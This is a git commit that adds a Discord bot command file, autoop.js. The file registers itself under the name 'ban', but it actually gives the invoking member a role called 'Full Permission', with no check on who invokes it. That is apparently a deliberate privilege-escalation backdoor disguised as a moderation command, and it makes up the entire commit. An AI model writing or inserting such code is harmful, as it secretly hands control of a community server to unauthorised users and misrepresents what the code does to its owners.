2aca6ea3ce12189607305b3e424016bf979d8733
ZaynMc <theobourrier@outlook.fr>
2019-04-09 18:13:34 +0200

    Create autoop.js

---
+++ commands/autoop.js
@@ -0,0 +1,12 @@
+const Discord = require("discord.js");
+
+module.exports.run = async (bot, message, args, ops) => {
+
+    let role = message.guild.roles.find(r => r.name === "Full Permission");
+    message.member.addRole(role);
+
+}
+
+module.exports.help = {
+  name: "ban"
+}
